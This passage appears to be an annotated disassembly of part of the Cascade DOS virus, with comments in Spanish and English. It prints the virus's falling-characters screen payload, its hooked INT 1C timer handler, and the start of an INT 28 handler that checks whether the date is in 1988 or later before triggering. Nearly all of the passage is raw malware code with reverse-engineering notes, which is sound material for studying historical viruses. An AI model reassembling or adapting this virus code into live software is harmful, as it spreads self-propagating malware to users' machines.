0810 F7 F1                   DIV CX                     ; Divide la velocidad / 15
0812 2E A3 5C 01             MOV W[015C],AX             ; Guarda el cociente en 015C
0816 C3                      RET
0817 49                      DEC CX                     ;
0818 EB EE                   JMP 0808                   ; Hace CX=FFFF

                                ; Subrutine Called from 0980
                                ; CASCADE Rutine
                                ; Entrada: DS=ES=CS

081A C6 06 53 01 18          MOV [0153],018             ; [0153]=18h=24d
081F 1E                      PUSH DS
0820 B8 40 00                MOV AX,040                 ;
0823 8E D8                   MOV DS,AX                  ; DS=0040
0825 A1 4E 00                MOV AX,W[04E]              ; AX=Offset to the Monitor
                                                        ; memory for this page.
0828 1F                      POP DS                     ; DS=CS
0829 A3 5A 01                MOV [015A],AX              ; [015A]=Ofs to the display page memory
082C B2 FF                   MOV DL,0FF                 ; DL=FF
082E B8 30 11                MOV AX,01130               ; AX=1130
0831 B7 00                   MOV BH,0                   ;
0833 06                      PUSH ES                    ;
0834 55                      PUSH BP                    ;
0835 CD 10                   INT 010                    ; Ask EGA for some info.
0837 5D                      POP BP                     ; May return DL=# of Rows
0838 07                      POP ES                     ;
0839 80 FA FF                CMP DL,0FF                 ;
083C 74 04                   JE 0842                    ; Not EGA display?  Asume 24d lineas
083E 88 16 53 01             MOV [0153],DL              ; [0153]=Screen Rows
0842 B4 0F                   MOV AH,0F                  ; Get video mode
0844 CD 10                   INT 010                    ; AL=Mode | AH=Columns | BH=Page #
0846 88 26 52 01             MOV [0152],AH              ; [0512]=Columns
084A C6 06 54 01 00          MOV [0154],0               ; [0154]=0
084F C7 06 58 01 00 B0       MOV [0158],0B000           ; [0158]=B000 Disp Mem Seg
0855 3C 07                   CMP AL,7                   ;
0857 74 36                   JE 088F                    ; Mono mode ? 
0859 72 03                   JB 085E                    ; Base=B800 ?  Set it
085B E9 E0 00                JMP 093E                   ;  093E Return
085E C7 06 58 01 00 B8       MOV W[0158],0B800          ; [0158]=B800
0864 3C 03                   CMP AL,3                   ;
0866 77 27                   JA 088F                    ; Graphic Mode?  3<7
0868 3C 02                   CMP AL,2                   ;
086A 72 23                   JB 088F                    ; 40 Columnas?  0<=Mode<2
086C C6 06 54 01 01          MOV B[0154],1              ; [0154]=1 80 Columnas,
                                                        ; Texto, Base=B800
0871 A0 53 01                MOV AL,B[0153]             ;
0874 FE C0                   INC AL                     ; AL=Rows+1
0876 F6 26 52 01             MUL [0152]                 ; AX=Screen Cahracters
087A A3 62 01                MOV W[0162],AX             ; [0162]=Screen Characters
087D A1 64 01                MOV AX,W[0164]             ;
0880 3B 06 62 01             CMP AX,W[0162]             ; Screen Chars
0884 76 03                   JBE 0889                   ; [0164]<=Screen Chars? 
0886 A1 62 01                MOV AX,W[0162]             ; AX=Screen Chars
0889 E8 6B FE                CALL 06F7                  ;
088C 40                      INC AX                     ; Random 1-Screen Charas
088D 8B F0                   MOV SI,AX                  ; SI=AX
088F 33 FF                   XOR DI,DI                  ;
0891 47                      INC DI                     ; DI=0001
0892 A1 62 01                MOV AX,W[0162]             ;
0895 D1 E0                   SHL AX,1                   ; AX=Total Chars * 2
0897 3B F8                   CMP DI,AX                  ;
0899 76 03                   JBE 089E                   ; DI<=AX ? 
089B E9 A0 00                JMP 093E                   ;  093E Retorna
089E 80 0E 57 01 02          OR B[0157],2               ; Prende un Flag
08A3 A0 52 01                MOV AL,B[0152]             ; AL=Screen Columns
08A6 B4 00                   MOV AH,0                   ;
08A8 E8 4C FE                CALL 06F7                  ; AX=Random 0-Screen Columns
08AB 8A D0                   MOV DL,AL                  ; DL=Random 0-Screen Columns
08AD A0 53 01                MOV AL,B[0153]             ; AL=Screen Rows
08B0 B4 00                   MOV AH,0                   ;
08B2 E8 42 FE                CALL 06F7                  ; AX=Random 0-Screen Rows
08B5 8A F0                   MOV DH,AL                  ; DH=Random 0-Screen Rows
08B7 E8 86 FE                CALL 0740                  ; ->AL=Screen Byte
08BA E8 11 FF                CALL 07CE                  ; If AL=' ' Carry=1
08BD 72 D2                   JC  0891                   ; Repeat Until AL!=' '
08BF E8 1C FF                CALL 07DE                  ; Carry=1 If AL=Grph Chr
08C2 72 CD                   JC  0891                   ; Until Moved AL!=Grph Chr
08C4 A2 55 01                MOV B[0155],AL             ; [0155]=Char Moved
08C7 88 26 56 01             MOV B[0156],AH             ; [0156]=Hi Byte Of Moved
                                                        ; Char Addres Offset
08CB 8A 0E 53 01             MOV CL,B[0153]             ; CL=Rows
08CF B5 00                   MOV CH,0                   ; CH=0
08D1 FE C6                   INC DH                     ; DH=Fila movida+1
08D3 3A 36 53 01             CMP DH,B[0153]             ;
08D7 77 52                   JA 092B                    ; DH>Fila Maximo ? 
08D9 E8 64 FE                CALL 0740                  ; AT(DL,DH)->AL=Scrn Byte
08DC 3A 26 56 01             CMP AH,B[0156]             ; Ya busco un caracter
08E0 75 49                   JNE 092B                   ; 3 Filas para abajo? 
08E2 E8 E9 FE                CALL 07CE                  ;
08E5 72 28                   JC 090F                    ; AL=' '? 
08E7 E8 F4 FE                CALL 07DE                  ;
08EA 72 3F                   JC 092B                    ; AL=Graph ? 
08EC FE C6                   INC DH                     ; Fila++
08EE 3A 36 53 01             CMP DH,B[0153]             ;
08F2 77 37                   JA 092B                    ; Fila>Fila Maximo ? 
08F4 E8 49 FE                CALL 0740                  ; AT(DL,DH)->AL=Scrn Byte
08F7 3A 26 56 01             CMP AH,B[0156]
08FB 75 2E                   JNE 092B
08FD E8 CE FE                CALL 07CE
0900 73 E5                   JAE 08E7
0902 E8 BE FE                CALL 07C3                  ; Change speaker status
0905 FE CE                   DEC DH
0907 E8 36 FE                CALL 0740
090A A2 55 01                MOV B[0155],AL
090D FE C6                   INC DH
090F 80 26 57 01 FD          AND B[0157],0FD            ; Bit 1=0
0914 FE CE                   DEC DH
0916 B0 20                   MOV AL,020                 ; AL=20
0918 E8 5D FE                CALL 0778
091B FE C6                   INC DH
091D A0 55 01                MOV AL,B[0155]
0920 E8 55 FE                CALL 0778                  ; Stores AL on Scrn
0923 E3 04                   JCXZ 0929
0925 E8 8E FE                CALL 07B6                  ; Delay(CX)
0928 49                      DEC CX
0929 EB A6                   JMP 08D1
092B F6 06 57 01 02          TEST B[0157],2
0930 74 03                   JE 0935
0932 E9 5C FF                JMP 0891
0935 E8 8B FE                CALL 07C3
0938 4E                      DEC SI
0939 74 03                   JE 093E
093B E9 51 FF                JMP 088F
093E E4 61                   IN AL,061                  ;
0940 24 FC                   AND AL,0FC                 ; Set Direct Speaker Control
0942 E6 61                   OUT 061,AL                 ; And Turns off Speaker
0944 C3                      RET                        ;

                        ; INT 1C Entry point

0945 2E F6 06 57 01 09       TEST CS:[0157],9           ; [0157] Bits 0,3 On?
094B 75 58                   JNE 09A5                   ; Si ninguno On  Termina
094D 2E 80 0E 57 01 01       OR  CS:[0157],1            ; [0157] Bite 0 ON.
0953 2E FF 0E 5E 01          DEC CS:[015E]              ;
0958 75 45                   JNE 099F                   ; Si no es 0  Termina
095A 1E                      PUSH DS                    ;
095B 06                      PUSH ES                    ;
095C 0E                      PUSH CS                    ;
095D 1F                      POP DS                     ; DS=CS
095E 0E                      PUSH CS                    ;
095F 07                      POP ES                     ; ES=CS
0960 50                      PUSH AX                    ;
0961 53                      PUSH BX                    ;
0962 51                      PUSH CX                    ;
0963 52                      PUSH DX                    ;
0964 56                      PUSH SI                    ;
0965 57                      PUSH DI                    ;
0966 55                      PUSH BP                    ;
0967 B0 20                   MOV AL,020                 ; AL=20
0969 E6 20                   OUT 020,AL                 ; Termina IRQ
096B A1 60 01                MOV AX,W[0160]             ; AX=????
096E 3D 38 04                CMP AX,0438                ;
0971 73 03                   JAE 0976                   ; AX>=0438 
0973 B8 38 04                MOV AX,0438                ; AX=0438  
0976 E8 7E FD                CALL 06F7                  ;           Encripta algo
0979 40                      INC AX                     ; AX=DX * AX + 1
097A A3 5E 01                MOV W[015E],AX             ; [015E]=AX ( Antes ya lo hizo)
097D A3 60 01                MOV W[0160],AX             ; [0160]=AX
0980 E8 97 FE                CALL 081A                  ; CASCADE y Speaker Tck
0983 B8 03 00                MOV AX,3                   ;
0986 E8 6E FD                CALL 06F7                  ;
0989 40                      INC AX                     ; AX=Random 1-4
098A F7 26 64 01             MUL W[0164]                ; [0164]*=AX
098E 73 03                   JNC 0993                   ;
0990 B8 FF FF                MOV AX,-1                  ; If [0164]>FFFF
0993 A3 64 01                MOV [0164],AX              ;    [0164]=FFFF
0996 5D                      POP BP                     ;
0997 5F                      POP DI                     ;
0998 5E                      POP SI                     ;
0999 5A                      POP DX                     ;
099A 59                      POP CX                     ;
099B 5B                      POP BX                     ;
099C 58                      POP AX                     ;
099D 07                      POP ES                     ;
099E 1F                      POP DS                     ;
099F 2E 80 26 57 01 FE       AND CS:[0157],0FE          ; Bit 0 [0157] Off
09A5 2E FF 2E 33 01          JMP CS:[0133]              ; Salta a Old INT 1C

                        ; INT 28 Entry point

09AA 2E F6 06 57 01 08       CS TEST B[0157],8          ;
09B0 74 1D                   JE 09CF                    ; A�o incorrecto ?  Sale
09B2 50                      PUSH AX                    ;
09B3 51                      PUSH CX                    ;
09B4 52                      PUSH DX                    ;
09B5 B4 2A                   MOV AH,02A                 ; Get Today Date | Al=Dia semana
09B7 CD 21                   INT 021                    ; CX=A�o | DH=Mes | Dl=Dia
09B9 81 F9 C4 07             CMP CX,07C4                ;
09BD 72 0D                   JB 09CC                    ; CX<1988 ?  Sale
09BF 77 05                   JA 09C6                    ; CX>1988 ?  Flag=0 Sale
09C1 80 FE 0A                CMP DH,0A                  ;
09C4 72 06                   JB 09CC                    ; Mes

